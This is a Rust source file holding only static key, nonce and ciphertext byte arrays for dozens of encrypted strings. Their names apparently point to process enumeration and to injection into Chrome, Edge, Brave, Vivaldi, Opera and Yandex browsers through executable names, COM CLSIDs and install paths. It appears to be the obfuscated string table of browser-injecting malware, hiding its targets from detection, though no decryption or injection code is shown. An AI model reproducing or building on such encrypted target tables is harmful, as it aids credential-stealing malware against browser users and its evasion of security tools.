pub static CLOSE_H_KEY: [u8; 32] = [0x5B, 0x01, 0x1B, 0xF0, 0xE1, 0x9A, 0x5A, 0x18, 0x47, 0xA1, 0x51, 0xF4, 0x8C, 0x43, 0x3A, 0xD6, 0x7F, 0x2D, 0x83, 0xFF, 0x9D, 0x62, 0x9F, 0x6B, 0x41, 0x15, 0x12, 0x23, 0xD5, 0xEE, 0x52, 0x7D];
pub static CLOSE_H_NONCE: [u8; 12] = [0x8D, 0xDF, 0x7A, 0x0E, 0x0C, 0xA1, 0xF5, 0xCC, 0x04, 0x0D, 0x9A, 0xA2];
pub static CLOSE_H_ENC: &[u8] = &[0x82, 0xCF, 0xA6, 0x64, 0xBD, 0xB0, 0x7F, 0xDF, 0x57, 0x7C, 0xA3, 0x68, 0xB2, 0xB9, 0xF5, 0xBD, 0xA1, 0x8B, 0x76, 0x85, 0xF9, 0x6E, 0x62, 0x44, 0x4A, 0xDE, 0x9D];
pub static CTX_SNAP_KEY: [u8; 32] = [0x21, 0x05, 0x7D, 0xA3, 0x97, 0x3D, 0xAF, 0x2A, 0x26, 0xC6, 0x55, 0xDE, 0xEE, 0x09, 0xEA, 0x0F, 0xDA, 0x76, 0xCE, 0x5B, 0x51, 0xED, 0x9C, 0x00, 0x26, 0x39, 0x3C, 0xCA, 0xE5, 0x31, 0x34, 0xD8];
pub static CTX_SNAP_NONCE: [u8; 12] = [0x00, 0x10, 0xDF, 0x19, 0x20, 0x8B, 0x50, 0x2F, 0x31, 0xA7, 0xC3, 0x61];
pub static CTX_SNAP_ENC: &[u8] = &[0xED, 0x68, 0xF7, 0xF7, 0xF2, 0x24, 0x70, 0x98, 0x18, 0x54, 0x02, 0xA6, 0xA5, 0x4B, 0x29, 0xA2, 0x9C, 0x0E, 0xC5, 0xC8, 0x99, 0x3B, 0x56, 0x01, 0x93, 0x86, 0xF1, 0xC5, 0x31, 0x7A, 0x26, 0x78, 0x55, 0x99, 0x1C, 0x1B, 0xCC, 0x5E, 0x21, 0xBD];
pub static P32_FIRST_KEY: [u8; 32] = [0xE7, 0xA3, 0x3A, 0x49, 0x8C, 0x6C, 0x33, 0x7D, 0x23, 0xAD, 0xFA, 0x83, 0x2F, 0xBD, 0x2E, 0x1A, 0x7A, 0x75, 0x05, 0x47, 0xC5, 0xB2, 0x98, 0xB2, 0x9A, 0x7A, 0x04, 0x7C, 0x82, 0x9F, 0x13, 0x56];
pub static P32_FIRST_NONCE: [u8; 12] = [0x34, 0x2F, 0x2E, 0xA2, 0x77, 0xB7, 0xCA, 0xC1, 0x53, 0xCB, 0x5A, 0xFB];
pub static P32_FIRST_ENC: &[u8] = &[0xBD, 0xA4, 0xED, 0x75, 0xCA, 0x5F, 0x66, 0x86, 0xD7, 0x80, 0x58, 0x14, 0xEE, 0xE8, 0x03, 0xB8, 0x0D, 0xC5, 0x82, 0xD9, 0x6F, 0x84, 0xC8, 0x7D, 0xD3, 0x9D, 0xA5, 0xE4, 0xDD, 0x35, 0x9E];
pub static P32_NEXT_KEY: [u8; 32] = [0x03, 0x74, 0xFA, 0x90, 0x90, 0x2F, 0x84, 0x9D, 0xA5, 0xEA, 0xDA, 0x6A, 0x1F, 0x9E, 0x14, 0x2F, 0x39, 0x51, 0xA3, 0x78, 0x50, 0xFE, 0xFD, 0x1C, 0x99, 0x58, 0x40, 0x50, 0xC0, 0x36, 0x42, 0x7D];
pub static P32_NEXT_NONCE: [u8; 12] = [0xE9, 0x33, 0x70, 0x43, 0x03, 0x5E, 0x3D, 0x6B, 0xB1, 0x8F, 0x7D, 0x51];
pub static P32_NEXT_ENC: &[u8] = &[0x0B, 0x93, 0x5B, 0x39, 0x77, 0x56, 0x1F, 0x7B, 0x0A, 0x23, 0x33, 0x67, 0xA5, 0xB5, 0xA1, 0x3C, 0x88, 0x2E, 0xEF, 0x82, 0x9E, 0xC7, 0x37, 0x49, 0xDE, 0x77, 0x69, 0xC3, 0xA1, 0x69];
pub static RL_KEY: [u8; 32] = [0xDE, 0xE6, 0xDF, 0xED, 0xDC, 0xD3, 0x2A, 0x70, 0xA9, 0xDA, 0xA8, 0x50, 0x79, 0x3C, 0xCD, 0x9B, 0xC8, 0xB4, 0x23, 0x67, 0xE4, 0x84, 0x9C, 0x10, 0xB6, 0x38, 0x1C, 0xB0, 0xF0, 0xEA, 0x66, 0x0B];
pub static RL_NONCE: [u8; 12] = [0x46, 0x39, 0x17, 0x70, 0xA3, 0x4B, 0xF1, 0xB8, 0xBD, 0xF2, 0x56, 0x6A];
pub static RL_ENC: &[u8] = &[0x88, 0xC4, 0x63, 0x80, 0xAE, 0xF6, 0x6B, 0xCF, 0xCF, 0xC4, 0x66, 0xBF, 0xD6, 0x41, 0x6F, 0x10, 0x62, 0x6A, 0x4E, 0x4B, 0x54, 0x9D, 0xA9, 0x40, 0x9B, 0x87, 0x9E, 0x03, 0xAB, 0xEB, 0x7D, 0xD9];
pub static INJ_CHROME_EXE_KEY: [u8; 32] = [0x97, 0x5F, 0x0B, 0xCB, 0x00, 0x3C, 0xD4, 0x39, 0xD6, 0xB7, 0xB6, 0x50, 0x31, 0x86, 0x7B, 0x40, 0xE5, 0xAC, 0xDD, 0x77, 0xB6, 0x78, 0x23, 0x52, 0xE8, 0x24, 0x89, 0x34, 0x33, 0x71, 0xBF, 0xFC];
pub static INJ_CHROME_EXE_NONCE: [u8; 12] = [0xD1, 0x33, 0xC7, 0x10, 0x4A, 0x7A, 0xB7, 0x3A, 0xDF, 0x26, 0x75, 0x45];
pub static INJ_CHROME_EXE_ENC: &[u8] = &[0xB1, 0xCB, 0x8C, 0xAD, 0x09, 0xB9, 0x51, 0x2C, 0x7D, 0x08, 0xA9, 0xF5, 0x5A, 0x6F, 0x95, 0x90, 0x37, 0xDC, 0x92, 0x30, 0xAC, 0xBE, 0x44, 0xC1, 0x1A, 0xA0];
pub static INJ_EDGE_EXE_KEY: [u8; 32] = [0x18, 0x6E, 0x13, 0xB5, 0x5C, 0x6A, 0xF2, 0x50, 0x40, 0x0B, 0x86, 0xBC, 0xC1, 0xBF, 0xB0, 0x6D, 0x9B, 0x83, 0x85, 0x60, 0xD5, 0x20, 0x04, 0x8A, 0x00, 0x79, 0xD0, 0x33, 0x8B, 0xE0, 0x23, 0x78];
pub static INJ_EDGE_EXE_NONCE: [u8; 12] = [0x8D, 0x73, 0xCD, 0x85, 0xBB, 0x6F, 0x7C, 0xBC, 0xCD, 0xF0, 0xA7, 0xAF];
pub static INJ_EDGE_EXE_ENC: &[u8] = &[0x5A, 0x0B, 0xDD, 0x53, 0xB7, 0xB7, 0x85, 0x88, 0xEF, 0x06, 0x9D, 0x05, 0x73, 0x1D, 0xF0, 0xE4, 0xE3, 0x2C, 0x42, 0x64, 0xB4, 0x93, 0xDC, 0x6E, 0x05, 0xFA];
pub static INJ_BRAVE_EXE_KEY: [u8; 32] = [0x17, 0x4B, 0xD5, 0x27, 0xDB, 0x4D, 0x2B, 0x15, 0x23, 0x99, 0x08, 0xE2, 0x7C, 0x90, 0x54, 0xBF, 0x90, 0x7E, 0xFB, 0x76, 0xFD, 0x73, 0x1C, 0xF9, 0xAC, 0x6A, 0xD4, 0x88, 0x9A, 0xCD, 0xD1, 0x0B];
pub static INJ_BRAVE_EXE_NONCE: [u8; 12] = [0x46, 0x77, 0x41, 0x32, 0xB9, 0x0D, 0xE3, 0xA4, 0xEC, 0xB3, 0x27, 0x54];
pub static INJ_BRAVE_EXE_ENC: &[u8] = &[0x15, 0x10, 0x91, 0x4C, 0x98, 0x81, 0x53, 0x30, 0xB1, 0x55, 0x11, 0x61, 0xEC, 0x5B, 0xAB, 0xF0, 0xEC, 0x80, 0x02, 0x4F, 0x51, 0xBA, 0x54, 0xEE, 0xA2];
pub static INJ_VIVALDI_EXE_KEY: [u8; 32] = [0xEA, 0x33, 0x18, 0x12, 0xFE, 0xAC, 0xF6, 0x25, 0x9D, 0x6E, 0x0E, 0xBD, 0x19, 0x3C, 0xFD, 0x7E, 0x7A, 0x67, 0xF7, 0x24, 0xB4, 0x2F, 0x80, 0x58, 0x29, 0xC4, 0x93, 0x2C, 0x3F, 0x91, 0x93, 0x6F];
pub static INJ_VIVALDI_EXE_NONCE: [u8; 12] = [0x5C, 0x90, 0x56, 0x4A, 0xF3, 0x67, 0x38, 0xEA, 0x0D, 0x99, 0xD8, 0xC6];
pub static INJ_VIVALDI_EXE_ENC: &[u8] = &[0x01, 0x51, 0xEA, 0x8D, 0xCE, 0x06, 0x8F, 0xB8, 0xD3, 0x9D, 0xF6, 0xF5, 0xE7, 0x99, 0xA6, 0x82, 0x44, 0x9A, 0xC8, 0x88, 0x1C, 0xBA, 0x09, 0x0F, 0x38, 0x85, 0x50];
pub static INJ_OPERA_EXE_KEY: [u8; 32] = [0xFC, 0x68, 0x57, 0x28, 0x8D, 0x8A, 0xD1, 0xB5, 0x07, 0xBF, 0xD5, 0xC1, 0xC2, 0x15, 0xD3, 0x9A, 0x48, 0x09, 0xBD, 0xD9, 0xBF, 0xB3, 0x90, 0x56, 0x08, 0x54, 0x4E, 0x39, 0x56, 0x45, 0x02, 0x2F];
pub static INJ_OPERA_EXE_NONCE: [u8; 12] = [0xC6, 0x8E, 0xD6, 0x9D, 0x02, 0x0C, 0xDD, 0x26, 0x70, 0x02, 0x4B, 0x23];
pub static INJ_OPERA_EXE_ENC: &[u8] = &[0xD2, 0xDA, 0x22, 0x11, 0x79, 0x6D, 0x81, 0x06, 0x7B, 0x42, 0xF3, 0x54, 0xC4, 0x77, 0x62, 0xC5, 0x95, 0xEC, 0xF6, 0x26, 0x9C, 0x46, 0x00, 0x40, 0xC7];
pub static INJ_BROWSER_EXE_KEY: [u8; 32] = [0xDB, 0x1A, 0xEF, 0x31, 0xC8, 0xBE, 0x22, 0xE4, 0xAB, 0x92, 0x68, 0xCD, 0xF0, 0x12, 0x7C, 0x8B, 0xE1, 0xF4, 0x1F, 0x72, 0xFD, 0xCB, 0xEF, 0xCA, 0xBA, 0x7C, 0xC7, 0xFC, 0x4B, 0x45, 0x2A, 0x9E];
pub static INJ_BROWSER_EXE_NONCE: [u8; 12] = [0xEB, 0x37, 0xF5, 0xC1, 0x58, 0xAB, 0x68, 0xA9, 0xAC, 0x81, 0x93, 0xF7];
pub static INJ_BROWSER_EXE_ENC: &[u8] = &[0xA9, 0x7A, 0xCD, 0x55, 0xB6, 0x08, 0x6A, 0x44, 0x20, 0x33, 0xAD, 0x67, 0xDB, 0x25, 0x6D, 0x85, 0x4E, 0x1A, 0xBE, 0x5E, 0x3E, 0xD4, 0x04, 0xF2, 0x3B, 0x5E, 0xD4];
pub static INJ_CLSID_CHROME_KEY: [u8; 32] = [0x21, 0x23, 0xBE, 0xB5, 0x1E, 0xC4, 0x0C, 0xAA, 0xA5, 0x0D, 0x18, 0xD1, 0x7F, 0xD7, 0x9F, 0x63, 0xD8, 0xDC, 0x4B, 0x2A, 0xF2, 0xD6, 0xA5, 0xC4, 0x5E, 0x1B, 0x24, 0x6F, 0xA4, 0x33, 0xDC, 0x57];
pub static INJ_CLSID_CHROME_NONCE: [u8; 12] = [0x8A, 0xC6, 0x3B, 0xE1, 0x00, 0xDA, 0x6C, 0x37, 0x21, 0xC7, 0x7F, 0xEC];
pub static INJ_CLSID_CHROME_ENC: &[u8] = &[0xDF, 0x30, 0xC2, 0x94, 0x35, 0xC6, 0x68, 0xBE, 0x33, 0x19, 0x3F, 0x0B, 0x04, 0x66, 0xB7, 0x73, 0x7F, 0xA3, 0x14, 0x60, 0xBA, 0x10, 0x7B, 0x28, 0x5A, 0x9A, 0xD2, 0x84, 0x62, 0x0D, 0x1A, 0x50, 0xC7, 0xC8, 0x12, 0xC4, 0xDA, 0x65, 0x9A, 0x09, 0x47, 0xB8, 0x24, 0x86, 0x35, 0xFF, 0xA6, 0x67, 0x96, 0x64, 0xE9, 0x16, 0x19, 0x72];
pub static INJ_CLSID_CHROME_BETA_KEY: [u8; 32] = [0x88, 0x2A, 0xBF, 0x18, 0xF1, 0x33, 0x8F, 0xCC, 0x67, 0x8E, 0x6E, 0xAF, 0xB4, 0xE3, 0x49, 0x93, 0xD9, 0x50, 0x1A, 0xE7, 0xE2, 0x13, 0x77, 0x0A, 0x12, 0x99, 0x9E, 0xE2, 0x60, 0x62, 0xE0, 0x35];
pub static INJ_CLSID_CHROME_BETA_NONCE: [u8; 12] = [0xBD, 0xEB, 0x06, 0xBD, 0x3F, 0x28, 0x52, 0x4B, 0xB4, 0xE9, 0xDB, 0x6F];
pub static INJ_CLSID_CHROME_BETA_ENC: &[u8] = &[0x91, 0x1A, 0x9F, 0xC5, 0xA5, 0x70, 0xD7, 0x45, 0x49, 0x7C, 0x29, 0x9F, 0x23, 0x45, 0x28, 0xC3, 0x13, 0x2C, 0x0F, 0x54, 0x93, 0x50, 0x33, 0x5C, 0x52, 0xE7, 0xD4, 0x5C, 0xF0, 0x0F, 0xCF, 0xCD, 0xCF, 0x47, 0x3B, 0xC9, 0xF3, 0x4D, 0xC1, 0x16, 0x34, 0x0F, 0x89, 0x5C, 0x5A, 0x86, 0x63, 0x58, 0x25, 0x3F, 0x14, 0x8E, 0x9B, 0x86];
pub static INJ_CLSID_CHROME_DEV_KEY: [u8; 32] = [0x25, 0xB6, 0x88, 0x19, 0x39, 0xD6, 0x86, 0xB2, 0xC5, 0xD3, 0x96, 0xB4, 0xF2, 0x3D, 0x85, 0x81, 0x24, 0x2A, 0xAB, 0xF6, 0xFD, 0x8F, 0x83, 0x82, 0x98, 0x74, 0x52, 0x6F, 0x19, 0x21, 0x1E, 0x40];
pub static INJ_CLSID_CHROME_DEV_NONCE: [u8; 12] = [0x96, 0x2E, 0x69, 0xEA, 0x9A, 0xFC, 0xED, 0xFB, 0x5A, 0xA1, 0xF3, 0x11];
pub static INJ_CLSID_CHROME_DEV_ENC: &[u8] = &[0x2E, 0xF9, 0xA9, 0x11, 0xA5, 0x56, 0x62, 0x07, 0x15, 0x4E, 0x2E, 0x4B, 0x2B, 0xAB, 0x98, 0x00, 0x9F, 0xE1, 0xAD, 0x01, 0x4C, 0xBB, 0x89, 0xDB, 0x11, 0x07, 0xF1, 0xD8, 0x1B, 0x81, 0x97, 0x27, 0x07, 0x59, 0x99, 0x84, 0x4D, 0x1A, 0xCF, 0xA6, 0xBB, 0x2A, 0xCA, 0x93, 0xAD, 0x1E, 0x21, 0x4B, 0x77, 0x6C, 0x75, 0x8D, 0xE7, 0xBA];
pub static INJ_CLSID_CHROME_CANARY_KEY: [u8; 32] = [0x82, 0x0B, 0xA2, 0x17, 0xF1, 0x71, 0x95, 0xCC, 0x80, 0xEC, 0x19, 0xEF, 0x3C, 0xF9, 0x5C, 0x85, 0x07, 0x67, 0x27, 0xBB, 0x8E, 0x5D, 0x43, 0x11, 0x9F, 0x20, 0x3E, 0x4E, 0xA9, 0xB1, 0x8D, 0x26];
pub static INJ_CLSID_CHROME_CANARY_NONCE: [u8; 12] = [0xF6, 0x41, 0x3C, 0x58, 0x54, 0xCF, 0xC8, 0x1D, 0xC4, 0x97, 0x0F, 0xA9];
pub static INJ_CLSID_CHROME_CANARY_ENC: &[u8] = &[0x84, 0x5A, 0x00, 0xFC, 0x4D, 0xFC, 0xCD, 0x45, 0x3C, 0x22, 0xF1, 0x2A, 0x9F, 0x5E, 0x92, 0xB8, 0xA8, 0xE1, 0xFC, 0xFD, 0x0B, 0xBA, 0x0B, 0x55, 0xDC, 0x88, 0x28, 0x04, 0x85, 0x14, 0xE2, 0x88, 0x48, 0xD1, 0xFD, 0x4B, 0x92, 0x49, 0xA2, 0x23, 0x75, 0x5C, 0xE3, 0xDA, 0x4B, 0xC5, 0x56, 0x42, 0x56, 0xE5, 0x89, 0x3A, 0xFC, 0x37];
pub static INJ_CLSID_EDGE_KEY: [u8; 32] = [0xF8, 0xA2, 0x13, 0x57, 0xE4, 0x0A, 0xCE, 0x1D, 0x55, 0x2C, 0x3C, 0x6F, 0xB2, 0x1C, 0xAD, 0xA1, 0x2C, 0xD3, 0xDA, 0xD6, 0xB1, 0x53, 0x6F, 0xE7, 0xF3, 0x90, 0x17, 0x58, 0xD2, 0xEF, 0x31, 0xAF];
pub static INJ_CLSID_EDGE_NONCE: [u8; 12] = [0x32, 0xEF, 0x35, 0xD2, 0xED, 0x06, 0xB5, 0x32, 0x9C, 0xCD, 0x0D, 0x1D];
pub static INJ_CLSID_EDGE_ENC: &[u8] = &[0xE7, 0xCC, 0xA8, 0xCA, 0x93, 0x19, 0xC6, 0xE8, 0x1A, 0xB7, 0x0E, 0x0E, 0x02, 0x55, 0x24, 0xFD, 0x3B, 0x3D, 0xAF, 0x29, 0x68, 0xF4, 0x20, 0x2D, 0x83, 0x77, 0x98, 0x33, 0x87, 0x07, 0x8A, 0x42, 0xB8, 0xF5, 0x2F, 0x75, 0xDD, 0x61, 0x6D, 0xB8, 0xA4, 0x66, 0x9D, 0xE6, 0x03, 0x7B, 0xEF, 0x8E, 0xA0, 0x16, 0xCC, 0xEE, 0x29, 0xCB];
pub static INJ_CLSID_BRAVE_KEY: [u8; 32] = [0x3F, 0xFF, 0xB3, 0x47, 0xFD, 0x56, 0x21, 0xC9, 0x80, 0xBC, 0xA7, 0xCB, 0x42, 0xA5, 0x7D, 0x44, 0x90, 0x22, 0x00, 0x43, 0x90, 0xA1, 0x86, 0x6E, 0x58, 0x68, 0x0F, 0x77, 0xC7, 0x77, 0x2D, 0x99];
pub static INJ_CLSID_BRAVE_NONCE: [u8; 12] = [0xB9, 0x06, 0x61, 0x0A, 0xCD, 0x78, 0x8F, 0xDE, 0x62, 0x48, 0x84, 0x22];
pub static INJ_CLSID_BRAVE_ENC: &[u8] = &[0xF5, 0x22, 0x98, 0x80, 0xDD, 0x29, 0x27, 0x4B, 0x03, 0xCD, 0x55, 0x2E, 0xE7, 0x28, 0xAA, 0x4A, 0xC2, 0x9D, 0xAC, 0x19, 0xB9, 0x54, 0x10, 0x74, 0xBA, 0xF2, 0x34, 0xA5, 0xCB, 0x74, 0x83, 0x74, 0xA4, 0x50, 0xFD, 0xC8, 0xC7, 0xCC, 0x19, 0x88, 0x8F, 0x55, 0xD1, 0xC3, 0x9D, 0xD7, 0xA7, 0xE4, 0x76, 0x4F, 0xBD, 0xA3, 0x99, 0xB4];
pub static INJ_PATH_LOCALAPPDATA_KEY: [u8; 32] = [0xD1, 0x0D, 0xCA, 0xC6, 0x9B, 0xE7, 0x7E, 0xD7, 0x91, 0x99, 0xBD, 0xF2, 0xEF, 0x74, 0x58, 0x87, 0x36, 0x76, 0xDC, 0xD0, 0x9F, 0x02, 0xEE, 0x10, 0xF0, 0x56, 0xDF, 0x55, 0xF4, 0x34, 0xAA, 0x6D];
pub static INJ_PATH_LOCALAPPDATA_NONCE: [u8; 12] = [0x32, 0x7A, 0x8A, 0x00, 0xB2, 0x4B, 0x50, 0x8A, 0xF1, 0xB6, 0x1E, 0x22];
pub static INJ_PATH_LOCALAPPDATA_ENC: &[u8] = &[0x94, 0x32, 0xFB, 0x1C, 0x59, 0xF4, 0x62, 0xC2, 0x07, 0x80, 0x35, 0xB3, 0x97, 0x5A, 0x0C, 0x0B, 0xE5, 0xCC, 0xA3, 0xA7, 0xCE, 0xB9, 0xB9, 0x15, 0x1E, 0xBF, 0x35, 0xA2];
pub static INJ_PATH_APPDATA_KEY: [u8; 32] = [0x9E, 0x3B, 0xD3, 0xA1, 0x37, 0xD6, 0x4B, 0xE0, 0x29, 0xF0, 0x5F, 0x5D, 0xE0, 0x3F, 0xFF, 0xBF, 0xB2, 0x2D, 0xFC, 0xC2, 0xBF, 0x56, 0xFA, 0x6D, 0xFB, 0xFF, 0x9C, 0xB9, 0xFE, 0xAF, 0xA5, 0xC5];
pub static INJ_PATH_APPDATA_NONCE: [u8; 12] = [0xA5, 0x67, 0x9F, 0x19, 0x41, 0x6A, 0x1B, 0xB4, 0x82, 0x47, 0x60, 0x72];
pub static INJ_PATH_APPDATA_ENC: &[u8] = &[0x27, 0x35, 0x68, 0xD3, 0x97, 0x59, 0xFA, 0xF3, 0x13, 0x75, 0xAF, 0x0C, 0x5B, 0x9C, 0xEA, 0x5D, 0xF8, 0xDF, 0x35, 0xE4, 0x8F, 0xF1, 0x27];
pub static INJ_PATH_PROGRAMFILES_KEY: [u8; 32] = [0x40, 0x87, 0xC1, 0xB6, 0xE2, 0xD1, 0x83, 0x7F, 0x41, 0xBE, 0xC7, 0x6D, 0x03, 0xCF, 0x3B, 0x4A, 0xFA, 0x36, 0xC8, 0x9F, 0x77, 0x9E, 0x9A, 0x9D, 0x5B, 0xB1, 0xB0, 0xBD, 0xD1, 0xEE, 0x4E, 0x32];
pub static INJ_PATH_PROGRAMFILES_NONCE: [u8; 12] = [0x7E, 0x4B, 0x5B, 0xC1, 0xFF, 0x63, 0xCB, 0x0D, 0xF8, 0x4E, 0x7B, 0x9D];
pub static INJ_PATH_PROGRAMFILES_ENC: &[u8] = &[0x6C, 0xC7, 0x3E, 0xD3, 0xE3, 0xA2, 0x86, 0x33, 0x89, 0x7C, 0x75, 0x73, 0x48, 0x9B, 0x2A, 0xD6, 0x2D, 0xD8, 0x43, 0xEC, 0xFC, 0xAE, 0xAD, 0x28, 0x74, 0xF4, 0xA0, 0x54];
pub static INJ_PATH_PF86_KEY: [u8; 32] = [0x8B, 0x33, 0x38, 0xA1, 0x00, 0x54, 0xA3, 0xBC, 0x9A, 0xDD, 0x21, 0x2A, 0xF9, 0xAB, 0x3A, 0x31, 0x5E, 0xDF, 0xCA, 0xB6, 0x15, 0x36, 0x6D, 0xE5, 0xB5, 0x48, 0xF6, 0x93, 0x88, 0x17, 0x82, 0xEA];
pub static INJ_PATH_PF86_NONCE: [u8; 12] = [0x5A, 0x1C, 0x19, 0xDA, 0x21, 0xB4, 0x52, 0x91, 0x15, 0x10, 0xB7, 0x8B];
pub static INJ_PATH_PF86_ENC: &[u8] = &[0xC9, 0x92, 0x89, 0x55, 0xE0, 0x40, 0xBF, 0x11, 0xDC, 0x6F, 0xED, 0xDC, 0xFF, 0x29, 0xA3, 0xB5, 0xD7, 0x8C, 0x38, 0xE4, 0xB0, 0xB7, 0xC8, 0x59, 0xD8, 0xF7, 0x1D, 0x29, 0xEA, 0x86, 0xF0, 0x26, 0x33];
pub static INJ_PATH_CHROME_APP_KEY: [u8; 32] = [0xEE, 0xF3, 0x44, 0xDA, 0x83, 0x23, 0xCF, 0xE7, 0xAB, 0xD9, 0x59, 0x80, 0xCD, 0xC0, 0xE6, 0x37, 0x99, 0x1F, 0x03, 0x4E, 0x8A, 0x03, 0x2D, 0x0B, 0x57, 0xC4, 0xC1, 0x36, 0xB3, 0xC5, 0xC6, 0xE7];
pub static INJ_PATH_CHROME_APP_NONCE: [u8; 12] = [0xA1, 0x58, 0x96, 0x5E, 0x7D, 0x0E, 0x2E, 0x41, 0x72, 0x74, 0x57, 0x09];
pub static INJ_PATH_CHROME_APP_ENC: &[u8] = &[0xB7, 0x99, 0x48, 0xD9, 0x74, 0xA4, 0xF1, 0xBB, 0x36, 0x82, 0x47, 0x4A, 0xD9, 0xD0, 0xF4, 0x07, 0xC1, 0x22, 0x57, 0x16, 0x26, 0xBD, 0x19, 0x7A, 0x73, 0x2B, 0x17, 0x6A, 0x73, 0x1F, 0xA0, 0x86, 0x6E, 0xF2, 0xBB, 0x41, 0x8B, 0xD9, 0x8D, 0xD3, 0xC3, 0x91, 0xF5, 0x10, 0x9B, 0x9F, 0xA8, 0x7C, 0x91, 0xD3, 0x38, 0xB8];
pub static INJ_PATH_EDGE_APP_KEY: [u8; 32] = [0x44, 0xB3, 0x27, 0x94, 0xF7, 0x1A, 0xAE, 0x1A, 0xC7, 0x3D, 0x99, 0xD3, 0x2F, 0xAB, 0x70, 0x38, 0xAE, 0xB1, 0x41, 0xFC, 0x8B, 0x05, 0x31, 0xE0, 0xEC, 0xBC, 0xBF, 0x80, 0xF2, 0x98, 0xF6, 0x77];
pub static INJ_PATH_EDGE_APP_NONCE: [u8; 12] = [0x7E, 0x0E, 0x6C, 0x06, 0x7A, 0x73, 0xB0, 0x33, 0xF0, 0x4D, 0x2A, 0xAB];
pub static INJ_PATH_EDGE_APP_ENC: &[u8] = &[0x56, 0x2C, 0x92, 0x31, 0x45, 0xF1, 0xD2, 0x44, 0x21, 0x53, 0xE9, 0x72, 0x20, 0xDD, 0x21, 0xE2, 0x1D, 0x33, 0x8B, 0x06, 0xA5, 0x22, 0xDE, 0xD1, 0x27, 0xE8, 0x7F, 0xAB, 0x2F, 0xE4, 0x1F, 0xA1, 0xED, 0x62, 0xC7, 0xB5, 0x1D, 0x18, 0xB0, 0xFD, 0x92, 0x5A, 0x68, 0xDC, 0x76, 0xCF, 0xCB, 0x06, 0x62, 0xA4, 0x22, 0xC8, 0xC3];
pub static INJ_PATH_BRAVE_APP_KEY: [u8; 32] = [0xB1, 0x8C, 0xBA, 0x29, 0x82, 0x76, 0x88, 0x55, 0xD9, 0x1D, 0x65, 0x12, 0xC3, 0x4B, 0x56, 0x1D, 0x80, 0xC4, 0x0E, 0x6E, 0x43, 0x9C, 0xC0, 0x7E, 0xE6, 0xD7, 0x33, 0x67, 0x00, 0x0A, 0x8C, 0xE6];
pub static INJ_PATH_BRAVE_APP_NONCE: [u8; 12] = [0x25, 0x0A, 0xD6, 0x86, 0x9E, 0x25, 0xB6, 0x81, 0xC7, 0x3F, 0x97, 0xD5];
pub static INJ_PATH_BRAVE_APP_ENC: &[u8] = &[0x76, 0x71, 0x99, 0xD4, 0x0C, 0xB4, 0xC5, 0x87, 0xB9, 0xA5, 0xC3, 0xB9, 0x72, 0xDB, 0xFE, 0x00, 0xBD, 0xB3, 0xD2, 0x57, 0x4A, 0x0E, 0x2B, 0x60, 0x83, 0x96, 0xB9, 0xE7, 0xD8, 0x2B, 0x1A, 0xB4, 0x1D, 0xA5, 0x6D, 0x29, 0x67, 0x6F, 0x8F, 0x81, 0xAD, 0xEF, 0x75, 0x3F, 0x6C, 0x7E, 0x00, 0x84, 0x8E, 0xDB, 0x1B, 0xE4, 0x60, 0x09, 0xD9, 0x86, 0x5E, 0x5E, 0x69, 0x10, 0x3E, 0x51, 0x5A, 0x06, 0x88];
pub static INJ_PATH_VIVALDI_APP_KEY: [u8; 32] = [0x9B, 0x9B, 0x41, 0xF6, 0xE5, 0xA4, 0xEB, 0xEC, 0x66, 0x34, 0x59, 0xB1, 0x0E, 0xBF, 0x03, 0x67, 0x23, 0xBA, 0x1F, 0x8C, 0x4E, 0x3F, 0x9E, 0x82, 0xDE, 0x21, 0x54, 0xFD, 0xD6, 0xBA, 0xC4, 0xD9];
pub static INJ_PATH_VIVALDI_APP_NONCE: [u8; 12] = [0xCC, 0x13, 0x38, 0xB6, 0xF2, 0x31, 0x78, 0xB8, 0x5B, 0x88, 0xE6, 0xEE];
pub static INJ_PATH_VIVALDI_APP_ENC: &[u8] = &[0x7C, 0xB4, 0x57, 0xD8, 0xDE, 0x29, 0x5C, 0x8F, 0x4D, 0x2A, 0xA8, 0x5A, 0xC7, 0xD9, 0xFD, 0x44, 0xE3, 0x5B, 0x65, 0x5E, 0x6C, 0xD1, 0x31, 0x5C, 0xC5, 0x9F, 0x36, 0xF0, 0x47, 0x73, 0x10, 0x6B, 0xFA, 0x17, 0x71, 0xE2, 0xEA, 0x49, 0x96, 0xF7, 0x1C, 0x2E, 0xA9, 0xAC, 0xDE, 0xC9, 0x46];
pub static INJ_PATH_OPERA_APP_KEY: [u8; 32] = [0x86, 0xAE, 0xEC, 0x7B, 0x8E, 0x2F, 0xD2, 0x16, 0x31, 0x09, 0x2A, 0x8B, 0x7D, 0xA2, 0xB7, 0xC0, 0x36, 0xC9, 0x73, 0x1F, 0x67, 0x25, 0x75, 0x12, 0x0F, 0x6C, 0xB1, 0xBA, 0xE3, 0x94, 0x40, 0xE4];
pub static INJ_PATH_OPERA_APP_NONCE: [u8; 12] = [0xF8, 0xC6, 0x5F, 0x23, 0x1D, 0xB4, 0x4B, 0xEA, 0x10, 0xAC, 0x41, 0x11];
pub static INJ_PATH_OPERA_APP_ENC: &[u8] = &[0xB1, 0x9C, 0xE3, 0xCD, 0x92, 0x3C, 0x7E, 0x8F, 0x7D, 0xBA, 0x07, 0x0B, 0xCF, 0x90, 0xDA, 0x60, 0x6F, 0x8C, 0x7E, 0xDC, 0x50, 0xBE, 0xA9, 0x50, 0x69, 0xB6, 0x64, 0x46, 0xEF, 0x57, 0x28, 0x02, 0xCD, 0x23, 0xDC, 0x2C, 0xF9, 0x49, 0xEA, 0xA1];
pub static INJ_PATH_YANDEX_APP_KEY: [u8; 32] = [0x6F, 0xAC, 0x80, 0xB7, 0x3A, 0x4D, 0x9A, 0xE7, 0x19, 0xAB, 0xB8, 0x6C, 0xE8, 0x8D, 0xFB, 0x51, 0xFE, 0xFC, 0xA3, 0x5A, 0xBB, 0x23, 0x97, 0x97, 0x48, 0x7A, 0x40, 0x9B, 0x23, 0xAA, 0x39, 0x29];
pub static INJ_PATH_YANDEX_APP_NONCE: [u8; 12] = [0x5A, 0xBB, 0xC6, 0x38, 0x94, 0x7C, 0xB8, 0xEA, 0x54, 0x42, 0x69, 0x2B];
